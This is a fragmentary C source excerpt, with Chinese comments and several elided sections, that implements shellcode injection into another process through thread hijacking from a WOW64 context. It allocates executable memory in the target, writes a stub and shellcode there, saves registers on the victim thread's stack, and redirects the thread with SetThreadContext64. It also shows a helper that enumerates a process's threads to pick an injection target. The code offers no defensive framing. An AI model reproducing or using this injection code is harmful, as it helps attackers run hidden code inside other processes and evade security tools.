...
BOOL Wow64InjectThreadShellcode(HANDLE hProcess, DWORD ThreadId, UINT8 * sc, int sc_len){
	BOOL ret = FALSE;
	_CONTEXT64 ctx = { 0 };
	UINT64  code = NULL;
	UINT64  sp;
	...
	if (!GetThreadContext64(hThread, &ctx)){
	...
	/*
	新分配的stack可能是由于rsp指向的刚好是无效的位置,所以CreateProcess suspend,resume 之后无法正常执行.
	这里直接使用原来的stack.
	*/
...
#define _SAVE_REGS(x) \
	do{	\
		sp -= 0x8;	\
		WriteProcessMemory64(hProcess, (UINT64)sp, &ctx.x, sizeof(ctx.x), &write_bytes);\
							}while(0) \
...
#define _SAVE_FLOAT_REGS(x) \
	...
	code = VirtualAllocEx64(hProcess, NULL, sizeof(shellcode_stub) + sc_len,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);			//32 -> 32
	//64 -> 64是无视权限的.
	...
	if (!WriteProcessMemory64(hProcess,
		code,
	...
	ret = SetThreadContext64(hThread, &ctx);
	if (ret){
...
failed_3:
	VirtualFreeEx64(hProcess, code, 0, MEM_RELEASE);
failed_2:
	ResumeThread(hThread);
failed_1:
	CloseHandle(hThread);
...
int InjectProcessShellcode(TCHAR * process, unsigned char * sc, int sc_len){
	...
	while (bFind){
		if (te32.th32OwnerProcessID == dwId){
			if (Wow64InjectThreadShellcode(hProcess, te32.th32ThreadID,
				sc,
				sc_len)){
				err = 0;
				break;
